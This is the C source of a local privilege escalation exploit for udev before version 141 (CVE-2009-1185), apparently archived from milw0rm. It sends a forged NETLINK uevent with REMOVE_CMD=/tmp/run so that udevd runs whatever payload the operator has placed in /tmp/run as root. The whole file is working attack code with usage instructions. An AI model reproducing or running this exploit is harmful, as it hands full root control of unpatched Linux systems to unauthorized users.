/*
 * cve-2009-1185.c
 *
 * udev < 141 Local Privilege Escalation Exploit
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185
 *
 *   udev before 1.4.1 does not verify whether a NETLINK message originates 
 *   from kernel space, which allows local users to gain privileges by sending 
 *   a NETLINK message from user space.
 *
 * Notes:
 *   
 *   An alternate version of kcope's exploit.  This exploit leverages the 
 *   95-udev-late.rules functionality that is meant to run arbitrary commands 
 *   when a device is removed.  A bit cleaner and reliable as long as your 
 *   distro ships that rule file.
 *
 *   Tested on Gentoo, Intrepid, and Jaunty.
 *
 * Usage:
 *
 *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, 
 *   usually is the udevd PID minus 1) as argv[1].
 *
 *   The exploit will execute /tmp/run as root so throw whatever payload you 
 *   want in there.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <linux/types.h>
#include <linux/netlink.h>

#ifndef NETLINK_KOBJECT_UEVENT
#define NETLINK_KOBJECT_UEVENT 15
#endif

int
main(int argc, char **argv)
{
	int sock;
	char *mp, *err;
	char message[4096];
	struct stat st;
	struct msghdr msg;
	struct iovec iovector;
	struct sockaddr_nl address;

	if (argc < 2) {
		err = "Pass the udevd netlink PID as an argument";
		printf("[-] Error: %s\n", err);
		exit(1);
	}

	if ((stat("/etc/udev/rules.d/95-udev-late.rules", &st) == -1) &&
	    (stat("/lib/udev/rules.d/95-udev-late.rules", &st) == -1)) {
		err = "Required 95-udev-late.rules not found";
		printf("[-] Error: %s\n", err);
		exit(1);
	}

	if (stat("/tmp/run", &st) == -1) {
		err = "/tmp/run does not exist, please create it";
		printf("[-] Error: %s\n", err);
		exit(1);
	}
	system("chmod +x /tmp/run");

	memset(&address, 0, sizeof(address));
	address.nl_family = AF_NETLINK;
	address.nl_pid = atoi(argv[1]);
	address.nl_groups = 0;

	msg.msg_name = (void*)&address;
	msg.msg_namelen = sizeof(address);
	msg.msg_iov = &iovector;
	msg.msg_iovlen = 1;

	sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
	bind(sock, (struct sockaddr *) &address, sizeof(address));

	mp = message;
	mp += sprintf(mp, "remove@/d") + 1;
	mp += sprintf(mp, "SUBSYSTEM=block") + 1;
	mp += sprintf(mp, "DEVPATH=/dev/foo") + 1;
	mp += sprintf(mp, "TIMEOUT=10") + 1;
	mp += sprintf(mp, "ACTION=remove") +1;
	mp += sprintf(mp, "REMOVE_CMD=/tmp/run") +1;

	iovector.iov_base = (void*)message;
	iovector.iov_len = (int)(mp-message);

	sendmsg(sock, &msg, 0);

	close(sock);

	return 0;
}

// milw0rm.com [2009-04-30]
